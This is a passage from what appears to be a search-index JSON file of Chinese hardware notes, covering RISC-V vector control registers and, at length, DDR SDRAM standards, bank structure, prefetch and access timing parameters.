\u200b\u6307\u4ee4\u200b\u8bbe\u7f6e\u200b\uff0c\u200b\u5355\u4f4d\u200b\u662f\u200b\u5143\u7d20\u200b\u4e2a\u6570\u200b\uff0c\u200b\u6700\u5927\u503c\u200b\u662f\u200b VLMAX</li> <li>vlenb: \u200b\u4fdd\u5b58\u200b\u4e86\u200b VLEN/8</li> <li>vstart\uff1a\u200b\u6267\u884c\u200b\u65f6\u200b\u8df3\u200b\u8fc7\u200b\u5f00\u5934\u200b\u7684\u200b\u4e00\u4e9b\u200b\u5143\u7d20\u200b\uff0c\u200b\u7528\u4e8e\u200b load/store \u200b\u7684\u200b\u5f02\u5e38\u200b\u6062\u590d\u200b</li> <li>vxrm: rounding mode</li> <li>vxsat: saturation flag</li> <li>vcsr: vxrm + vxsat</li> </ul>"},{"location":"hardware/sdram.html","title":"SDRAM (Synchronous Dynamic Random Access Memory)","text":""},{"location":"hardware/sdram.html#_1","title":"\u7279\u70b9","text":"<p>SDRAM \u200b\u7684\u200b\u7279\u70b9\u200b\uff1a</p> <ol> <li>\u200b\u6210\u672c\u200b\u8f83\u200b\u4f4e\u200b\uff0c\u200b\u6bcf\u4e2a\u200b 1 bit cell \u200b\u53ea\u200b\u9700\u8981\u200b\u4e00\u4e2a\u200b CMOS \u200b\u6676\u4f53\u7ba1\u200b</li> <li>\u200b\u63a5\u53e3\u200b\u590d\u6742\u200b\uff0c\u200b\u8bbf\u95ee\u200b\u6570\u636e\u200b\u524d\u200b\u9700\u8981\u200b\u9996\u5148\u200b\u6fc0\u6d3b\u200b\u4e00\u4e2a\u200b row\uff0c\u200b\u518d\u200b\u8bfb\u53d6\u200b row \u200b\u5185\u200b\u7684\u200b\u6570\u636e\u200b</li> <li>\u200b\u63a7\u5236\u5668\u200b\u4e5f\u200b\u6bd4\u8f83\u590d\u6742\u200b\uff0c\u200b\u9700\u8981\u200b\u5b9a\u671f\u200b\u5237\u65b0\u200b\u5185\u5b58\u200b</li> <li>\u200b\u5bb9\u91cf\u200b\u8f83\u5927\u200b\uff0c\u200b\u7531\u4e8e\u200b row \u200b\u548c\u200b column \u200b\u590d\u7528\u200b\u4e86\u200b\u5730\u5740\u200b\u7ebf\u200b\uff0c\u200b\u5355\u200b\u5185\u5b58\u6761\u200b\u53ef\u4ee5\u200b\u505a\u5230\u200b GB \u200b\u7ea7\u522b\u200b\u7684\u200b\u5bb9\u91cf\u200b</li> </ol>"},{"location":"hardware/sdram.html#_2","title":"\u6807\u51c6","text":"<p>SDRAM \u200b\u76f8\u5173\u200b\u6807\u51c6\u200b\u7531\u200b JEDEC \u200b\u5236\u5b9a\u200b\uff1a</p> <ul> <li>JESD79F: DDR SDRAM</li> <li>JESD79-2F: DDR2 SDRAM</li> <li>JESD79-3F: DDR3 SDRAM</li> <li>JESD79-4D: DDR4 SDRAM</li> <li>JESD79-5B: DDR5 SDRAM</li> </ul> <p>\u200b\u9664\u4e86\u200b DDR \u200b\u7cfb\u5217\u200b\uff0c\u200b\u8fd8\u6709\u200b\u4f4e\u529f\u8017\u200b\u7684\u200b LPDDR \u200b\u7cfb\u5217\u200b\uff1a</p> <ul> <li>JESD209B: LPDDR SDRAM</li> <li>JESD209-2F: LPDDR2 SDRAM</li> <li>JESD209-3C: LPDDR3 SDRAM</li> <li>JESD209-4D: LPDDR4 SDRAM</li> <li>JESD209-5B: LPDDR5 SDRAM</li> </ul> <p>\u200b\u9ad8\u6027\u80fd\u200b\u5e38\u7528\u200b\u7684\u200b HBM \u200b\u4e5f\u200b\u57fa\u4e8e\u200b SDRAM \u200b\u6280\u672f\u200b\uff1a</p> <ul> <li>JESD235D: HBM</li> <li>JESD238A: HBM3</li> <li>JESD270-4: HBM4</li> </ul> <p>\u200b\u8fd8\u6709\u200b GDDR SGRAM \u200b\u7cfb\u5217\u200b\uff1a</p> <ul> <li>SDRAM3.11.5.8 R16.01: GDDR4 SGRAM</li> <li>JESD212C.01: GDDR5 SGRAM</li> <li>JESD232A.01: GDDR5X SGRAM</li> <li>JESD250D: GDDR6 SGRAM</li> </ul> <p>\u200b\u4e0b\u9762\u200b\u4e3b\u8981\u200b\u4ecb\u7ecd\u200b DDR \u200b\u7cfb\u5217\u200b\u7684\u200b SDRAM\u3002</p>"},{"location":"hardware/sdram.html#_3","title":"\u6982\u5ff5","text":"<p>DDR SDRAM \u200b\u901a\u5e38\u200b\u4f1a\u200b\u6709\u200b\u4e00\u4e2a\u200b\u6570\u5b57\u200b\u6765\u200b\u4ee3\u8868\u200b\u5b83\u200b\u7684\u200b\u6027\u80fd\u200b\uff0c\u200b\u4f8b\u5982\u200b DDR4-2133 \u200b\u4e2d\u200b\u7684\u200b 2133\uff0c\u200b\u6709\u65f6\u5019\u200b\u4f1a\u200b\u89c1\u5230\u200b 2400 MT/s \u200b\u7684\u200b\u8bf4\u6cd5\u200b\u3002\u200b\u8fd9\u200b\u4e24\u8005\u200b\u8bf4\u200b\u7684\u200b\u90fd\u200b\u662f\u200b SDRAM \u200b\u6bcf\u79d2\u200b\u6700\u200b\u591a\u200b\u8fdb\u884c\u200b\u7684\u200b\u6570\u636e\u4f20\u8f93\u200b\u6b21\u6570\u200b\uff0c\u200b\u5355\u4f4d\u200b\u662f\u200b Million Transfers per Second\u3002\u200b\u7531\u4e8e\u200b SDRAM \u200b\u91c7\u7528\u200b DDR \u200b\u8fdb\u884c\u200b\u4f20\u8f93\u200b\uff0c\u200b\u4e00\u4e2a\u200b\u65f6\u949f\u200b\u5468\u671f\u200b\u4f20\u8f93\u200b\u4e24\u4efd\u200b\u6570\u636e\u200b\uff0c\u200b\u6240\u4ee5\u200b\u5b9e\u9645\u200b\u7684\u200b\u65f6\u949f\u200b\u9891\u7387\u200b\u8981\u200b\u9664\u4ee5\u200b\u4e8c\u200b\uff0c\u200b\u4f8b\u5982\u200b 2133 MT/s \u200b\u5bf9\u5e94\u200b\u65f6\u949f\u200b\u9891\u7387\u200b\u5c31\u662f\u200b 1066 MHz\u3002</p> <p>\u200b\u6709\u65f6\u200b\u8fd8\u4f1a\u200b\u89c1\u5230\u200b PC4-21333 \u200b\u7684\u200b\u5199\u6cd5\u200b\u7528\u4e8e\u200b\u63cf\u8ff0\u200b\u5185\u5b58\u6761\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u7684\u200b \\(21333=8*2666\\)\uff0c\u200b\u5bf9\u5e94\u200b\u4e86\u200b 2666 MT/s\uff0c\u200b\u4e58\u4ee5\u200b 8 \u200b\u662f\u56e0\u4e3a\u200b DDR \u200b\u5185\u5b58\u6761\u200b\u7684\u200b\u6570\u636e\u4f4d\u200b\u5bbd\u200b\u662f\u200b 64 \u200b\u4f4d\u200b\uff0c\u200b\u90a3\u4e48\u200b\u4e00\u4e2a\u200b 2666 MT/s \u200b\u7684\u200b\u5185\u5b58\u6761\u200b\u5176\u200b\u7406\u8bba\u200b\u5185\u5b58\u200b\u5e26\u5bbd\u200b\u5c31\u662f\u200b \\(2666 \\mathrm{(MT/s)} * 64 \\mathrm{(bits)} / 8 \\mathrm{(bits/byte)} = 21333 \\mathrm{(MB/s)}\\)\u3002\u200b\u4f46\u200b\u4e5f\u200b\u6709\u4e9b\u200b\u65f6\u5019\u200b PC4 \u200b\u540e\u9762\u200b\u8ddf\u7740\u200b\u7684\u200b\u5c31\u662f\u200b MT/s\u3002</p> <p>\u200b\u4e0d\u540c\u200b\u4ee3\u6b21\u200b\u7684\u200b\u5185\u5b58\u6761\u200b\uff0c\u200b\u4e0b\u9762\u200b\u5f15\u811a\u200b\u7684\u200b\u7f3a\u53e3\u200b\u4f4d\u7f6e\u200b\u4e0d\u540c\u200b\uff0c\u200b\u6240\u4ee5\u200b\u662f\u200b\u65e0\u6cd5\u200b\u63d2\u9519\u200b\u5730\u65b9\u200b\u7684\u200b\u3002</p>"},{"location":"hardware/sdram.html#_4","title":"\u7ed3\u6784","text":"<p>\u200b\u4ee5\u200b DDR4 SDRAM \u200b\u4e3a\u4f8b\u200b\uff0c\u200b\u4e0b\u9762\u200b\u662f\u200b MT40A1G8 \u200b\u82af\u7247\u200b\u7684\u200b\u7ed3\u6784\u56fe\u200b\uff1a</p> <p> </p> MT40A1G8 \u200b\u7684\u200b\u7ed3\u6784\u200b\u6846\u56fe\u200b\uff08\u200b\u56fe\u6e90\u200b Micron Datasheet\uff09 <p>\u200b\u4fdd\u5b58\u200b\u6570\u636e\u200b\u7684\u200b\u662f\u200b\u4e2d\u95f4\u200b\u7684\u200b Memory array\uff0c\u200b\u6bcf\u4e2a\u200b Memory array \u200b\u7684\u200b\u89c4\u683c\u200b\u662f\u200b 65536 x 128 x 64\uff0c\u200b\u79f0\u4e3a\u200b\u4e00\u4e2a\u200b Bank\uff1b\u200b\u56db\u4e2a\u200b Bank \u200b\u7ec4\u6210\u200b\u4e00\u4e2a\u200b Bank Group\uff0c\u200b\u4e00\u5171\u200b\u6709\u200b 4 \u200b\u4e2a\u200b Bank Group\uff0c\u200b\u6240\u4ee5\u200b\u603b\u200b\u5bb9\u91cf\u200b\u662f\u200b \\(65536 * 128 * 64 * 4 * 4 = 8 \\mathrm{Gb}\\)\u3002</p> <p>\u200b\u5177\u4f53\u200b\u5730\u200b\uff0c\u200b\u6bcf\u4e2a\u200b Memory array \u200b\u7684\u200b 65536 x 128 x 64 \u200b\u7684\u200b\u89c4\u683c\u200b\u91cc\u200b\uff0c65536 \u200b\u8868\u793a\u200b row \u200b\u7684\u200b\u6570\u91cf\u200b\uff0c\u200b\u6bcf\u4e2a\u200b row \u200b\u4fdd\u5b58\u200b\u4e86\u200b \\(128 * 64 = 8192\\) \u200b\u4f4d\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u540c\u65f6\u200b\u4e5f\u200b\u662f\u200b\u56fe\u200b 1 \u200b\u4e2d\u200b <code>Sense amplifier</code> \u200b\u5230\u200b <code>I/O gating, DM mask logic</code> \u200b\u4e4b\u95f4\u200b\u4f20\u8f93\u200b\u7684\u200b\u4f4d\u200b\u5bbd\u200b\u3002\u200b\u6bcf\u4e2a\u200b row \u200b\u6709\u200b 1024 \u200b\u4e2a\u200b column\uff0c\u200b\u6bcf\u4e2a\u200b column \u200b\u4fdd\u5b58\u200b\u4e86\u200b 8 \u200b\u4f4d\u200b\u7684\u200b\u6570\u636e\u200b\uff08\u200b\u5bf9\u5e94\u200b <code>1 Gig x 8</code> \u200b\u4e2d\u200b\u7684\u200b 8\uff09\u3002\u200b\u7531\u4e8e\u200b DDR4 \u200b\u7684\u200b prefetch \u200b\u5bbd\u5ea6\u200b\u662f\u200b 8n\uff0c\u200b\u6240\u4ee5\u200b\u4e00\u6b21\u200b\u8bbf\u95ee\u200b\u4f1a\u200b\u53d6\u51fa\u200b 8 \u200b\u4e2a\u200b column \u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b 64 \u200b\u4f4d\u200b\u3002\u200b\u90a3\u4e48\u200b\u6bcf\u4e2a\u200b row \u200b\u5c31\u662f\u200b 128 \u200b\u4e2a\u200b 64 \u200b\u4f4d\u200b\u6570\u636e\u200b\uff0c\u200b\u8fd9\u200b\u5c31\u662f\u200b\u4e0a\u9762\u200b\u6240\u8bf4\u200b\u7684\u200b 65536 x 128 x 64 \u200b\u7684\u200b 128 x 64 \u200b\u7684\u200b\u6765\u6e90\u200b\u3002</p> <p>\u200b\u6bcf\u4e2a\u200b row \u200b\u6709\u200b 1024 \u200b\u4e2a\u200b column\uff0c\u200b\u6240\u4ee5\u200b column \u200b\u5730\u5740\u200b\u5c31\u200b\u6709\u200b 10 \u200b\u4f4d\u200b\u3002\u200b\u4f46\u200b\u5b9e\u9645\u4e0a\u200b\uff0c\u200b\u56e0\u4e3a\u200b Burst Length \u200b\u662f\u200b 8\uff0c\u200b\u6240\u4ee5\u200b\u5b9e\u9645\u4e0a\u200b\u9ad8\u200b 7 \u200b\u4f4d\u200b\uff08\u200b\u5bf9\u5e94\u200b <code>128 x 64</code> \u200b\u7684\u200b 128\uff09\u200b\u4f1a\u200b\u9009\u62e9\u200b\u51fa\u200b 8 \u200b\u4e2a\u200b column\uff0c\u200b\u4f4e\u200b 3 \u200b\u4f4d\u200b\u51b3\u5b9a\u200b\u4e86\u200b\u8fd9\u4e9b\u200b column \u200b\u7684\u200b\u4f20\u8f93\u200b\u987a\u5e8f\u200b\uff0c\u200b\u8fd9\u662f\u200b\u4e3a\u4e86\u200b\u65b9\u4fbf\u200b\u7f13\u5b58\u200b refill \u200b\u7684\u200b\u4f18\u5316\u200b\uff0c\u200b\u628a\u200b\u8981\u200b\u8bfb\u53d6\u200b\u7684\u200b\u90e8\u5206\u200b\u5148\u200b\u53d6\u51fa\u200b\u6765\u200b\uff1a</p> <p> </p> DDR4 Burst \u200b\u7c7b\u578b\u200b\u548c\u200b Column \u200b\u6b21\u5e8f\u200b\uff08\u200b\u56fe\u6e90\u200b JESD9-4D DDR4\uff09"},{"location":"hardware/sdram.html#prefetch","title":"Prefetch","text":"<p>SDRAM \u200b\u6709\u200b Prefetch \u200b\u7684\u200b\u6982\u5ff5\u200b\uff0c\u200b\u542b\u4e49\u200b\u5c31\u662f\u200b\u4e00\u6b21\u200b\u8bfb\u53d6\u200b\u4f1a\u200b\u53d6\u51fa\u200b\u4f4d\u200b\u5bbd\u200b\u7684\u200b\u591a\u5c11\u500d\u200b\u7684\u200b\u6570\u636e\u200b\u51fa\u6765\u200b\u3002\u200b\u4f8b\u5982\u200b\u4e0a\u9762\u200b\u7684\u200b <code>1 Gig x 8</code> \u200b\u7684\u200b SDRAM\uff0c\u200b\u5176\u200b I/O \u200b\u6570\u636e\u4f4d\u200b\u5bbd\u200b\u662f\u200b 8 \u200b\u4f4d\u200b\uff08\u200b\u89c1\u200b\u53f3\u4fa7\u200b\u7684\u200b <code>DQ</code> \u200b\u4fe1\u53f7\u200b\uff09\u3002\u200b\u4f46\u200b\u5b9e\u9645\u4e0a\u200b\u4ece\u200b <code>Global I/O Gating</code> \u200b\u51fa\u6765\u200b\u7684\u200b\u6570\u636e\u200b\u662f\u200b 64 \u200b\u4f4d\u200b\uff0c\u200b\u5dee\u200b\u4e86\u200b\u4e00\u4e2a\u200b 8 \u200b\u7684\u200b\u56e0\u5b50\u200b\uff0c\u200b\u8fd9\u200b\u5c31\u662f\u200b DDR4 \u200b\u7684\u200b 8n Prefetch\u3002\u200b\u8fd9\u200b\u662f\u56e0\u4e3a\u200b\uff0cDDR4 SDRAM \u200b\u7684\u200b IO \u200b\u9891\u7387\u200b\u662f\u200b\u5f88\u200b\u9ad8\u200b\u7684\u200b\uff0c\u200b\u4f8b\u5982\u200b 3200 MT/s \u200b\u5bf9\u5e94\u200b\u7684\u200b I/O \u200b\u65f6\u949f\u200b\u9891\u7387\u200b\u662f\u200b 1600 MHz\uff0c\u200b\u800c\u200b\u5b9e\u9645\u200b\u7684\u200b Memory array \u200b\u9891\u7387\u200b\u505a\u200b\u4e0d\u5230\u200b\u8fd9\u4e48\u200b\u9ad8\u200b\uff0c\u200b\u800c\u662f\u200b\u5de5\u4f5c\u200b\u5728\u200b 400 MHz\uff0c\u200b\u4e3a\u4e86\u200b\u5f25\u8865\u200b\u9891\u7387\u200b\u7684\u200b\u5dee\u8ddd\u200b\uff0c\u200b\u4e00\u6b21\u200b\u8bfb\u53d6\u200b 8 \u200b\u500d\u4f4d\u200b\u5bbd\u200b\u7684\u200b\u6570\u636e\u200b\u3002\u200b\u4f53\u73b0\u200b\u5728\u200b I/O \u200b\u4e0a\u200b\u5c31\u662f\u200b\u4e00\u6b21\u200b\u8bfb\u200b\u64cd\u4f5c\u200b\u5f97\u5230\u200b 8 \u200b\u4efd\u200b\u6570\u636e\u200b\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b Burst Length \u200b\u4e3a\u200b 8\uff0c\u200b\u901a\u8fc7\u200b DDR \u200b\u65b9\u5f0f\u200b\u5728\u200b\u56db\u4e2a\u200b\u65f6\u949f\u200b\u5468\u671f\u200b\u5185\u200b\u4f20\u8f93\u200b\u3002</p> <p>\u200b\u6709\u8da3\u200b\u7684\u200b\u662f\u200b\uff0cDDR4 \u200b\u5185\u5b58\u6761\u200b\u4f4d\u200b\u5bbd\u200b\u662f\u200b 64\uff0c\u200b\u90a3\u4e48\u200b\u4e00\u6b21\u200b\u8bfb\u200b\u64cd\u4f5c\u200b\u5c31\u200b\u5f97\u5230\u200b \\(64 * 8 / 8 = 64B\\) \u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u6b63\u597d\u200b\u662f\u200b\u5f88\u591a\u200b CPU \u200b\u7f13\u5b58\u200b\u884c\u200b\u7684\u200b\u5927\u5c0f\u200b\u3002</p> <p>DDR5 \u200b\u628a\u200b Prefetch \u200b\u63d0\u9ad8\u200b\u5230\u200b\u4e86\u200b 16n\uff0c\u200b\u8fd9\u200b\u4e5f\u200b\u5c31\u662f\u200b\u4e3a\u4ec0\u4e48\u200b\u770b\u5230\u200b\u7684\u200b DDR5 \u200b\u7684\u200b\u6570\u636e\u200b\u901f\u7387\u200b\u6570\u5b57\u200b\u5927\u200b\u4e86\u200b\u5f88\u591a\u200b\uff1a\u200b\u540c\u6837\u200b\u7684\u200b Memory array \u200b\u9891\u7387\u200b\u4e0b\u200b\uff0cDDR4 \u200b\u7684\u200b Prefetch \u200b\u662f\u200b 8n\uff0cDDR5 \u200b\u7684\u200b Prefetch \u200b\u662f\u200b 16n\uff0c\u200b\u4e8e\u662f\u200b I/O \u200b\u9891\u7387\u200b\u7ffb\u500d\u200b\uff0c\u200b\u6570\u636e\u200b\u901f\u7387\u200b\u4e5f\u200b\u7ffb\u500d\u200b\u3002\u200b\u540c\u65f6\u200b\u4e3a\u4e86\u200b\u7ee7\u7eed\u200b\u4fdd\u6301\u200b\u4e00\u4e2a\u200b Burst \u200b\u662f\u200b 64 \u200b\u5b57\u8282\u200b\uff0cDDR5 \u200b\u5185\u5b58\u6761\u200b\u6bcf\u4e2a\u200b channel \u200b\u4f4d\u200b\u5bbd\u200b\u662f\u200b 32 \u200b\u4f4d\u200b\uff0c\u200b\u6bcf\u4e2a\u200b\u5185\u5b58\u6761\u200b\u63d0\u4f9b\u200b\u4e24\u4e2a\u200b channel\u3002</p>"},{"location":"hardware/sdram.html#_5","title":"\u8bbf\u95ee\u200b\u6a21\u5f0f","text":"<p>SDRAM \u200b\u7684\u200b\u8bbf\u95ee\u200b\u6a21\u5f0f\u200b\u6bd4\u8f83\u200b\u7279\u522b\u200b\uff0c\u200b\u5b83\u200b\u7684\u200b Memory array \u200b\u6bcf\u6b21\u200b\u53ea\u80fd\u200b\u4ee5\u200b\u6574\u4e2a\u200b row \u200b\u4e3a\u200b\u5355\u4f4d\u200b\u8fdb\u884c\u200b\u5b58\u53d6\u200b\u3002\u200b\u5728\u200b\u524d\u9762\u200b\u7684\u200b\u4f8b\u5b50\u200b\uff08<code>1 Gig x 8</code>\uff09\u200b\u4e2d\u200b\uff0c\u200b\u4e00\u4e2a\u200b row \u200b\u6709\u200b 8192 \u200b\u4f4d\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u4f46\u662f\u200b\u4e00\u6b21\u200b\u8bfb\u200b\u6216\u200b\u5199\u200b\u64cd\u4f5c\u200b\u53ea\u200b\u6d89\u53ca\u200b 64 \u200b\u4f4d\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u56e0\u6b64\u200b\u4e00\u6b21\u200b\u8bfb\u200b\u64cd\u4f5c\u200b\u9700\u8981\u200b\uff1a</p> <ol> <li>\u200b\u7b2c\u4e00\u6b65\u200b\uff0c\u200b\u5148\u200b\u628a\u200b\u6570\u636e\u200b\u6240\u5728\u200b\u7684\u200b\u6574\u4e2a\u200b row \u200b\u53d6\u51fa\u200b\u6765\u200b</li> <li>\u200b\u7b2c\u4e8c\u6b65\u200b\uff0c\u200b\u5728\u200b row \u200b\u91cc\u200b\u8bfb\u51fa\u200b\u60f3\u8981\u200b\u7684\u200b\u6570\u636e\u200b</li> </ol> <p>\u200b\u4f46\u662f\u200b\u6bcf\u4e2a\u200b Bank \u200b\u540c\u65f6\u200b\u53ea\u80fd\u200b\u53d6\u51fa\u200b\u6765\u200b\u4e00\u4e2a\u200b row\uff0c\u200b\u6240\u4ee5\u200b\u5982\u679c\u200b\u4e24\u6b21\u200b\u8bfb\u200b\u6d89\u53ca\u200b\u5230\u200b\u4e86\u200b\u4e0d\u540c\u200b\u7684\u200b row\uff0c\u200b\u90a3\u4e48\u200b\u9700\u8981\u200b\uff1a</p> <ol> <li>\u200b\u7b2c\u4e00\u6b65\u200b\uff0c\u200b\u5148\u200b\u628a\u200b\u7b2c\u4e00\u6b21\u200b\u8bfb\u200b\u7684\u200b\u6570\u636e\u200b\u6240\u5728\u200b\u7684\u200b\u6574\u4e2a\u200b row \u200b\u53d6\u51fa\u200b\u6765\u200b</li> <li>\u200b\u7b2c\u4e8c\u6b65\u200b\uff0c\u200b\u5728\u200b row \u200b\u91cc\u200b\u8bfb\u51fa\u200b\u60f3\u8981\u200b\u7684\u200b\u6570\u636e\u200b</li> <li>\u200b\u7b2c\u4e09\u6b65\u200b\uff0c\u200b\u628a\u200b\u7b2c\u4e00\u6b21\u200b\u8bfb\u200b\u7684\u200b row \u200b\u653e\u200b\u56de\u53bb\u200b</li> <li>\u200b\u7b2c\u56db\u6b65\u200b\uff0c\u200b\u628a\u200b\u7b2c\u4e8c\u6b21\u200b\u8bfb\u200b\u7684\u200b\u6570\u636e\u200b\u6240\u5728\u200b\u7684\u200b\u6574\u4e2a\u200b row \u200b\u53d6\u51fa\u200b\u6765\u200b</li> <li>\u200b\u7b2c\u4e94\u6b65\u200b\uff0c\u200b\u5728\u200b row \u200b\u91cc\u200b\u8bfb\u51fa\u200b\u60f3\u8981\u200b\u7684\u200b\u6570\u636e\u200b</li> </ol> <p>\u200b\u7528\u200b SDRAM \u200b\u7684\u200b\u672f\u8bed\u200b\u6765\u8bb2\u200b\uff0c\u200b\u7b2c\u4e00\u6b65\u200b\u548c\u200b\u7b2c\u56db\u6b65\u200b\u53eb\u505a\u200b Activate\uff0c\u200b\u7b2c\u4e8c\u90e8\u200b\u548c\u200b\u7b2c\u4e94\u6b65\u200b\u53eb\u505a\u200b Read\uff0c\u200b\u7b2c\u4e09\u6b65\u200b\u53eb\u505a\u200b Precharge\u3002</p> <p>SDRAM \u200b\u5b9a\u4e49\u200b\u4e86\u200b\u4e0b\u5217\u200b\u7684\u200b\u65f6\u5e8f\u200b\u53c2\u6570\u200b\uff0c\u200b\u63cf\u8ff0\u200b\u4e86\u200b\u8fd9\u200b\u4e09\u4e2a\u200b\u64cd\u4f5c\u200b\u4e4b\u95f4\u200b\u7684\u200b\u65f6\u5e8f\u200b\u8981\u6c42\u200b\uff1a</p> <ol> <li>CL\uff08CAS Latency\uff09\uff1a\u200b\u53d1\u9001\u200b\u8bfb\u200b\u8bf7\u6c42\u200b\uff0c\u200b\u5230\u200b\u8f93\u51fa\u200b\u7b2c\u4e00\u4e2a\u200b\u6570\u636e\u200b\u7684\u200b\u65f6\u95f4\u200b</li> <li>RCD\uff08ACT to internal read or write delay time\uff09\uff1a\u200b\u4ece\u200b Activate \u200b\u5230\u200b\u4e0b\u200b\u4e00\u4e2a\u200b\u8bfb\u200b\u6216\u200b\u5199\u200b\u8bf7\u6c42\u200b\u7684\u200b\u65f6\u95f4\u200b</li> <li>RP\uff08RRE command period\uff09\uff1a\u200b\u53d1\u9001\u200b Precharge \u200b\u547d\u4ee4\u200b\u5230\u200b\u4e0b\u200b\u4e00\u4e2a\u200b\u547d\u4ee4\u200b\u7684\u200b\u65f6\u95f4\u200b</li> <li>RAS\uff08ACT to PRE command period\uff09\uff1a\u200b\u4ece\u200b Activate \u200b\u5230\u200b Precharge \u200b\u4e4b\u95f4\u200b\u7684\u200b\u65f6\u95f4\u200b</li> <li>RC\uff08ACT to ACT or REF command period\uff09\uff1a\u200b\u4ece\u200b Activate \u200b\u5230\u200b\u4e0b\u200b\u4e00\u4e2a\u200b Activate \u200b\u6216\u8005\u200b Refresh \u200b\u4e4b\u95f4\u200b\u7684\u200b\u65f6\u95f4\u200b</li> <li>RTP\uff08Internal READ Command to PRECHARGE command delay\uff09\uff1a\u200b\u4ece\u200b Read \u200b\u5230\u200b Precharge \u200b\u4e4b\u95f4\u200b\u7684\u200b\u65f6\u95f4\u200b</li> </ol> <p>\u200b\u4e8e\u662f\u200b\u4e0a\u9762\u200b\u7684\u200b\u6d41\u7a0b\u200b\u9700\u8981\u200b\u7684\u200b\u65f6\u95f4\u200b\u8981\u6c42\u200b\u5c31\u662f\u200b\uff1a</p> <ol> <li>\u200b\u7b2c\u4e00\u6b65\u200b\uff0cActivate\uff0c\u200b\u53d6\u51fa\u200b\u7b2c\u4e00\u4e2a\u200b row</li> <li>\u200b\u7b2c\u4e8c\u6b65\u200b\uff0cRead\uff0c\u200b\u7b2c\u4e00\u6b65\u200b\u548c\u200b\u7b2c\u4e8c\u6b65\u200b\u4e4b\u95f4\u200b\u8981\u200b\u9694\u200b RCD \u200b\u7684\u200b\u65f6\u95f4\u200b\uff0c\u200b\u4ece\u200b Read \u200b\u53d1\u9001\u200b\u5730\u5740\u200b\u5230\u200b\u5f97\u5230\u200b\u6570\u636e\u200b\u8981\u200b\u7b49\u5f85\u200b CL \u200b\u7684\u200b\u65f6\u95f4\u200b</li> <li>\u200b\u7b2c\u4e09\u6b65\u200b\uff0cPrecharge\uff0c\u200b\u7b2c\u4e00\u6b65\u200b\u548c\u200b\u7b2c\u4e09\u6b65\u200b\u4e4b\u95f4\u200b\u8981\u200b\u9694\u200b RAS \u200b\u7684\u200b\u65f6\u95f4\u200b\uff0c\u200b\u7b2c\u4e8c\u6b65\u200b\u548c\u200b\u7b2c\u4e09\u6b65\u200b\u4e4b\u95f4\u200b\u8981\u200b\u9694\u200b RTP \u200b\u7684\u200b\u65f6\u95f4\u200b</li> <li>\u200b\u7b2c\u56db\u6b65\u200b\uff0cActivate\uff0c\u200b\u53d6\u51fa\u200b\u7b2c\u4e8c\u4e2a\u200b row\uff0c\u200b\u7b2c\u4e00\u6b65\u200b\u548c\u200b\u7b2c\u56db\u6b65\u200b\u4e4b\u95f4\u200b\u8981\u200b\u9694\u200b RC \u200b\u7684\u200b\u65f6\u95f4\u200b\uff0c\u200b\u7b2c\u4e09\u6b65\u200b\u548c\u200b\u7b2c\u56db\u6b65\u200b\u4e4b\u95f4\u200b\u8981\u200b\u9694\u200b RP \u200b\u7684\u200b\u65f6\u95f4\u200b</li> <li>\u200b\u7b2c\u4e94\u6b65\u200b\uff0cRead\uff0c\u200b\u7b2c\u56db\u6b65\u200b\u548c\u200b\u7b2c\u4e94\u6b65\u200b\u4e4b\u95f4\u200b\u8981\u200b\u9694\u200b RCD \u200b\u7684\u200b\u65f6\u95f4\u200b\uff0c\u200b\u4ece\u200b Read \u200b\u53d1\u9001\u200b\u5730\u5740\u200b\u5230\u200b\u5f97\u5230\u200b\u6570\u636e\u200b\u8981\u200b\u7b49\u5f85\u200b CL \u200b\u7684\u200b\u65f6\u95f4\u200b</li> </ol> <p>\u200b\u6839\u636e\u200b\u8fd9\u4e2a\u200b\u6d41\u7a0b\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5f97\u5230\u200b\u4ee5\u4e0b\u200b\u7684\u200b\u7ed3\u8bba\u200b\uff1a</p> <ol> <li>\u200b\u8bbf\u95ee\u200b\u5e26\u6709\u200b\u5c40\u90e8\u6027\u200b\u7684\u200b\u6570\u636e\u200b\u6027\u80fd\u200b\u4f1a\u200b\u66f4\u597d\u200b\uff0c\u200b\u53ea\u200b\u9700\u8981\u200b\u8fde\u7eed\u200b\u5730\u200b\u8fdb\u884c\u200b Read\uff0c\u200b\u51cf\u5c11\u200b Activate \u200b\u548c\u200b Precharge \u200b\u6b21\u6570\u200b</li> <li>\u200b\u4e0d\u65ad\u200b\u8bbf\u95ee\u200b\u4e0d\u540c\u200b\u7684\u200b row \u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u4f1a\u200b\u5bfc\u81f4\u200b\u9700\u8981\u200b\u6765\u56de\u200b\u5730\u200b Activate\uff0cRead\uff0cPrecharge \u200b\u5faa\u73af\u200b</li> <li>\u200b\u8bbf\u95ee\u200b row \u200b\u548c\u200b\u8bbf\u95ee\u200b row \u200b\u4e2d\u200b\u7684\u200b\u6570\u636e\u200b\u5206\u6210\u200b\u4e24\u4e2a\u200b\u9636\u6bb5\u200b\uff0c\u200b\u4e24\u4e2a\u200b\u9636\u6bb5\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b\u540c\u6837\u200b\u7684\u200b\u5730\u5740\u200b\u4fe1\u53f7\u200b\uff0c\u200b\u4f7f\u5f97\u200b\u5185\u5b58\u200b\u603b\u200b\u5bb9\u91cf\u200b\u5f88\u5927\u200b</li> <li>\u200b\u800c\u200b\u5982\u679c\u200b\u8bbf\u95ee\u200b\u603b\u662f\u200b\u547d\u4e2d\u200b\u540c\u4e00\u4e2a\u200b row\uff0c\u200b\u5c31\u200b\u4e0d\u200b\u9700\u8981\u200b Activate \u200b\u548c\u200b Prechage\uff0c\u200b\u53ef\u4ee5\u200b\u6301\u7eed\u200b Read\uff0c\u200b\u83b7\u5f97\u200b\u63a5\u8fd1\u200b\u7406\u8bba\u200b\u7684\u200b\u4f20\u8f93\u901f\u7387\u200b\uff0c\u200b\u5982\u56fe\u200b\uff1a</li> </ol> <p> </p> DDR3 \u200b\u540c\u4e00\u4e2a\u200b Row 